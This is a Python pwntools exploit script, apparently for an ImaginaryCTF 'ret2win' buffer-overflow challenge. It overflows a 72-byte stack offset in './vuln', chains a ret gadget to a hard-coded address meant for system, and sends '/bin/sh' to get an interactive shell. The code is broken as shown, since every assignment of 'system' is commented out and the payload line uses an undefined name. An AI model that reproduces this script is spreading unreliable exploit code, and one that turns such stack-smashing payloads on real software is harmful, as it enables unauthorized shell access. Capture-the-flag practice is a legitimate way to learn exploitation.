from pwn import *

exe = ELF("./vuln")
# io = process('./vuln')
io = gdb.debug("./vuln", "start")
# io = gdb.debug("./vuln", """
# b *0x401179
# continue
# """)
# 0x401179
# io = remote('ret2win.chal.imaginaryctf.org', '1337')

context.binary = exe
gets_ret = 0x000000000040116e
pop_ret = 0x000000000040113d
ret = 0x000000000040101a
# system = 0x0000000000401050 
# system = 0x401054
# system = 0x401034
# system = 0x0000000000401191 


offset = 72
# payload = b'A' * offset + pack(system)
payload = b'A' * offset + pack(ret) + pack(system)
# payload = b'A' * offset + pack(pop_ret) + pack(system) * 2
io.sendline(payload)
# io.sendline(b"cat flag.txt")
io.sendline(b'/bin/sh\x00')
io.interactive()

